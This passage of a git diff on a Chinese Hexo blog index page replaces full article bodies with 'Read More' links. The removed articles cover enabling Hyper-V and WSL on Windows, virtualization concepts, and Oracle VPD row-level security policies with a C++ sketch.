25000&#125;);</span><br><span class="line">eth.getBalance(<span class="string">&#x27;0x4126B653636e5a47aBd28408FB285B6Bf69fEFb7&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
+        
+          <p class="article-more-link">
+            <a href="/2024/04/14/Block-Chain/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -777,73 +315,11 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>简单的使用与原理介绍</p>
-<h2 id="家庭版windows开启hyper-v功能"><a href="#家庭版windows开启hyper-v功能" class="headerlink" title="家庭版windows开启hyper-v功能"></a>家庭版windows开启hyper-v功能</h2><p>新建文件Hyper-V.cmd如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">dir /b %SystemRoot%\servicing\Packages\*Hyper-V*.mum &gt;hyper-v.txt</span><br><span class="line"></span><br><span class="line">for /f %%i in (&#x27;findstr /i . hyper-v.txt 2^&gt;nul&#x27;) do dism /online /norestart /add-package:&quot;%SystemRoot%\servicing\Packages\%%i&quot;</span><br><span class="line"></span><br><span class="line">del hyper-v.txt</span><br><span class="line"></span><br><span class="line">Dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL</span><br></pre></td></tr></table></figure>
-
-<p>以管理员模式运行等待处理完成后，遵循提示重启电脑。现在windows管理工具中出现了Hyper-v管理器项目</p>
-<hr>
-<p>通过powershell开启Hyper-v功能：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All</span><br></pre></td></tr></table></figure>
-
-<p>开启wsl功能</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br></pre></td></tr></table></figure>
-
-<p>通过系统设置开启Hyper-v功能，与命令行等效：</p>
-<ol>
-<li>右键单击 Windows 按钮并选择“应用和功能”。</li>
-<li>选择相关设置下右侧的“程序和功能”。</li>
-<li>选择“打开或关闭 Windows 功能”。</li>
-<li>选择“Hyper-V”，然后单击“确定”。</li>
-</ol>
-<p>通过系统设置开启wsl功能，与命令行等效：</p>
-<ol>
-<li>打开控制面板。</li>
-<li>点击 “程序”。</li>
-<li>在 “程序和功能” 下，点击 “启用或关闭 Windows 功能”。</li>
-<li>在弹出的窗口中，找到 “适用于 Linux 的 Windows 子系统”，勾选该选项。</li>
-</ol>
-<h2 id="卸载wsl子系统"><a href="#卸载wsl子系统" class="headerlink" title="卸载wsl子系统"></a>卸载wsl子系统</h2><p>查看当前环境安装的wsl</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --list</span><br></pre></td></tr></table></figure>
-
-<p>注销（卸载）当前安装的Linux的Windows子系统</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --unregister Ubuntu</span><br></pre></td></tr></table></figure>
-
-<p>卸载成功，查看当前安装的Linux的Windows子系统</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --list</span><br></pre></td></tr></table></figure>
-
-<p>查看可安装的Linux的Windows子系统</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --list --online</span><br></pre></td></tr></table></figure>
-
-<p>从 WSL 取消注册发行版，以便可以重新安装或清理它。注意： 一旦取消注册，与该发行版相关的所有数据、设置和软件都将永久丢失。从商店重新安装将安装分发的干净副本。</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>傻瓜式安装</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
-
-<p>设置用户名和密码</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enter UNIX username:jack</span><br><span class="line">enter password for jack:1234</span><br></pre></td></tr></table></figure>
-
-<p>设置root密码</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br><span class="line">[sudo] password for jack:</span><br><span class="line">New password:1234</span><br><span class="line">Retype new password:1234</span><br></pre></td></tr></table></figure>
-
-<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>首先，type1与type2虚拟机架构区别如下图所示，其中关键区别在于Hypervisor处在的层级不同：</p>
-<p><img src="/images/image-20230726181937164.png" alt="image-20230726181937164"></p>
-<p>Hyper-v是type1虚拟机，可以看到，type1虚拟机是一种更彻底的虚拟化，所有的操作系统都作为guest os，其虚拟化是真正的硬件层面；而type2虚拟机是一种更浅层的虚拟化，其Hypervisor是作为host os的软件运行的，是操作系统层面的虚拟化</p>
-<p>关于性能方面：两者的优劣是显而易见的，对于想要使用的虚拟机，type1能通过Hypervisor直接和硬件交互，而type2需要通过Hypervisor经由host os才能和硬件交互，因此对于想要使用的虚拟机，type1拥有更好的性能。而对于计算机原本的系统，type1将原本的host os变为了guest os，因此性能受到一定影响，而type2中host os状态不变，不会受到性能影响</p>
-<h2 id="计算机虚拟化补充"><a href="#计算机虚拟化补充" class="headerlink" title="计算机虚拟化补充"></a>计算机虚拟化补充</h2><p><strong>计算虚拟化</strong>通过虚拟化管理程序（Hypervisor或VMM）将物理服务器的硬件资源与上层应用进行解耦，形成统一的计算资源池，然后可弹性分配给逻辑上隔离的虚拟机共享使用。基于VMM所在位置与虚拟化范围可以分为多种类型：</p>
-<ul>
-<li>全虚拟化</li>
-</ul>
-<p>全虚拟化使用一个虚拟机作为虚拟机管理器(Hypervisor)，统一调度客户操作系统与原始硬件，Hypervisor会捕捉和处理与虚拟化相关的特权指令，使客户操作系统无须修改就能运行，但性能也会低于物理机，代表性的产品包括ESX、KVM、Oracle Virtual Box。<strong>全虚拟化的特点是不需要改动任何guest os的源码，guest os理论上不知道自己是虚拟机</strong></p>
-<ul>
-<li>半虚拟化</li>
-</ul>
-<p>半虚拟化技术与全虚拟化有相似之处，也是利用Hypervisor来实现对底层硬件的共享访问，区别在于半虚拟化技术将与虚拟化相关的代码集成到客户操作系统中，使客户端操作系统与Hypervisor更好地配合，因此Hypervisor不需要重新编译或捕获特权指令，其性能可以非常接近物理机，缺点在于其支持的客户操作系统受限，用户体验较差，经典的产品有Xen和Hyper-V。<strong>需要对guest os源码进行修改，guest os知道自己是虚拟机，因此能更好地处理难以虚拟化的指令</strong></p>
-<ul>
-<li>硬件辅助虚拟化（跟上面两个不是并列关系）</li>
-</ul>
-<p>硬件辅助虚拟化是通过对部分全虚拟化和半虚拟化使用到的软件技术进行硬件化处理来提高性能，是对全虚拟化和半虚拟化的一种优化，如今许多虚拟机产品都逐渐支持这样的特性。</p>
-<hr>
-<p><strong>容器（应用级虚拟化）</strong>：容器是一种更加轻量的应用级虚拟化技术，将应用的可执行文件及其所需的运行时环境与依赖库打包，实现一次构建，到处运行的目标。相比虚拟化，容器技术多了容器引擎层（如Docker），但上层应用无需与Guest OS绑定，可以实现秒级部署、跨平台迁移，灵活的资源分配，弹性调度管理等优势。容器、微服务与DevOps为云原生的三大要素，是推动企业技术中台建设与微服务化转型不可或缺的组件。</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/04/14/HyperV-WSL/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
@@ -882,53 +358,11 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>测试自用</p>
-<h2 id="常用写法"><a href="#常用写法" class="headerlink" title="常用写法"></a>常用写法</h2><p>上下文函数，用于行级安全谓词</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR <span class="built_in">REPLACE</span> FUNCTION EMP_ACCESS_FUNCTION (</span><br><span class="line">  schema_var <span class="keyword">IN</span> VARCHAR2,</span><br><span class="line">  table_var  <span class="keyword">IN</span> VARCHAR2</span><br><span class="line">)</span><br><span class="line">RETURN VARCHAR2</span><br><span class="line">IS</span><br><span class="line">  predicate VARCHAR2(<span class="number">200</span>);</span><br><span class="line">BEGIN</span><br><span class="line">  <span class="keyword">IF</span> USER <span class="keyword">IN</span> (&#x27;HR_EMPLOYEE&#x27;) THEN</span><br><span class="line">    predicate := &#x27;<span class="number">1</span>=<span class="number">1</span>&#x27;; -- 人力资源部门员工可以访问所有数据</span><br><span class="line">  <span class="keyword">ELSE</span></span><br><span class="line">    predicate := &#x27;DEPARTMENT = SYS_CONTEXT(&#x27;&#x27;USERENV&#x27;&#x27;, &#x27;&#x27;CURRENT_USER&#x27;&#x27;)&#x27;; -- 其他部门员工只能访问自己部门的数据</span><br><span class="line">  END <span class="keyword">IF</span>;</span><br><span class="line">  RETURN predicate;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
-
-<p>定义安全策略</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">  DBMS_RLS.ADD_POLICY(</span><br><span class="line">    object_schema   =&gt; &#x27;HR&#x27;,</span><br><span class="line">    object_name     =&gt; &#x27;EMPLOYEES&#x27;,</span><br><span class="line">    policy_name     =&gt; &#x27;EMP_ACCESS_POLICY&#x27;,</span><br><span class="line">    function_schema =&gt; &#x27;HR&#x27;,</span><br><span class="line">    policy_function =&gt; &#x27;EMP_ACCESS_FUNCTION&#x27;,</span><br><span class="line">    statement_types =&gt; &#x27;SELECT&#x27;</span><br><span class="line">  );</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
-
-<h2 id="模拟程序示例"><a href="#模拟程序示例" class="headerlink" title="模拟程序示例"></a>模拟程序示例</h2><p>讲解配文</p>
-<h3 id="行级访问限制"><a href="#行级访问限制" class="headerlink" title="行级访问限制"></a>行级访问限制</h3><p>策略函数部分：</p>
-<ul>
-<li>行级访问限制中，一般通过一些数据库函数如sys_context获得当前会话的用户名</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR <span class="built_in">REPLACE</span> FUNCTION func0()&#123;return user01;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>DBMS_RLS包：</p>
-<ul>
-<li>模式名，选择表的所有者sys</li>
-<li>填入表名，策略名称</li>
-<li>策略函数模式名，系统用户名sys</li>
-<li>策略函数选择刚才编写的func0</li>
-<li>应用的关键字通常选择SELECT</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">  DBMS_RLS.ADD_POLICY(</span><br><span class="line">    object_schema   =&gt;sys</span><br><span class="line">    object_name     =&gt;list</span><br><span class="line">    policy_name     =&gt;test01</span><br><span class="line">    function_schema =&gt;sys</span><br><span class="line">    policy_function =&gt;func0</span><br><span class="line">    statement_types =&gt;SELECT</span><br><span class="line">  );</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
-
-<p>SQL语句输入：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM list</span><br><span class="line">SELECT id FROM list WHERE sal&gt;<span class="number">200</span></span><br><span class="line">SELECT id FROM list WHERE sal&gt;<span class="number">200</span> ORDER BY sal</span><br></pre></td></tr></table></figure>
-
-<h3 id="列访问限制"><a href="#列访问限制" class="headerlink" title="列访问限制"></a>列访问限制</h3><p>策略函数部分：</p>
-<ul>
-<li>列访问限制中，一般返回NULL或布尔值，比如1&#x3D;0表达式表示false</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR <span class="built_in">REPLACE</span> FUNCTION func0()&#123;return <span class="number">1</span>=<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>DBMS_RLS包</p>
-<ul>
-<li>与之前类似，写好对应参数</li>
-<li>填上sec_relevant_cols，比如限制id字段</li>
-<li>sec_relevant_cols_opt，填写all_row表示对所有行都限制</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">  DBMS_RLS.ADD_POLICY(</span><br><span class="line">    object_schema   =&gt;sys</span><br><span class="line">    object_name     =&gt;list</span><br><span class="line">    policy_name     =&gt;test01</span><br><span class="line">    function_schema =&gt;sys</span><br><span class="line">    policy_function =&gt;func0</span><br><span class="line">    statement_types =&gt;SELECT</span><br><span class="line">    sec_relevant_cols =&gt;id</span><br><span class="line">    sec_relevant_cols_opt =&gt;dbms_rls.all_row</span><br><span class="line">  );</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
-
-<p>SQL语句输入</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,sal,name FROM list WHERE sal&gt;<span class="number">200</span></span><br><span class="line">SELECT id FROM list WHERE sal&gt;<span class="number">200</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">VPDPolicy</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"> <span class="type">int</span> policyType;</span><br><span class="line">    <span class="type">int</span> groupedLength;</span><br><span class="line">    </span><br><span class="line"> <span class="type">bool</span> enable;</span><br><span class="line">    <span class="type">bool</span> groupEnable;</span><br><span class="line"> <span class="type">bool</span> updateCheck;</span><br><span class="line">    <span class="type">bool</span> ifGrouped;</span><br><span class="line">    <span class="type">bool</span> validateRes;</span><br><span class="line"></span><br><span class="line"> string policySqlEdit;</span><br><span class="line"></span><br><span class="line"> string objectSchema;</span><br><span class="line"> string objectName;</span><br><span class="line"> string policyName;</span><br><span class="line"> string functionSchema;</span><br><span class="line"> string policyFunction;</span><br><span class="line"> string statementTypes;</span><br><span class="line"></span><br><span class="line"> string secRelevantCols;</span><br><span class="line"> string secRelevantColsOpt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> <span class="built_in">VPDPolicy</span>() :<span class="built_in">policyType</span>(<span class="number">0</span>), <span class="built_in">enable</span>(<span class="literal">true</span>), <span class="built_in">updateCheck</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">  Tool::<span class="built_in">addPolicy</span>(policy);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> ~<span class="built_in">VPDPolicy</span>() &#123;</span><br><span class="line">  Tool::<span class="built_in">dropPolicy</span>(policy);</span><br><span class="line"> &#125;</span><br><span class="line">......    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DBMS_RLS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DBMS_RLS</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;准备添加或编辑策略...&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addPolicy</span><span class="params">(VPDPolicy&amp; vpdPolicy, string policyOriginalName)</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;添加策略：&quot;</span> &lt;&lt; vpdPolicy.<span class="built_in">showName</span>() &lt;&lt; endl;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">enablePolicy</span><span class="params">(VPDPolicy&amp; policy)</span> </span>&#123;</span><br><span class="line">        policy.<span class="built_in">activate</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">disablePolicy</span><span class="params">(VPDPolicy&amp; policy)</span> </span>&#123;</span><br><span class="line">        policy.<span class="built_in">deactivate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">evaluatePolicy</span><span class="params">(VPDPolicy&amp; policy)</span> </span>&#123;&#125;</span><br><span class="line"> ......</span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">alterPolicy</span><span class="params">(VPDPolicy&amp; policy)</span> </span>&#123;&#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/04/14/VPD-test/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
